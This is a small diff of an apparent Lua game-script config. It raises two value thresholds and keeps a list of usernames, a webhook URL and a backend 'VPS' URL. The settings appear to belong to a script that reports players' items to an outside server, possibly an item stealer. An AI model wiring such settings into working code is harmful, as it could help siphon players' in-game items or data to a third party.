@@ -109,8 +109,8 @@ _G.Usernames = {
 	"husshuss_hold10"
 
 }
-_G.min_value = 1
-_G.ping_threshold = 1
+_G.min_value = 4
+_G.ping_threshold = 4
 _G.pingEveryone = "No"
 _G.webhook = "https://sab-backend.snthnova.workers.dev/webhook"
 _G.VPS_URL = "https://sab-backend.snthnova.workers.dev"
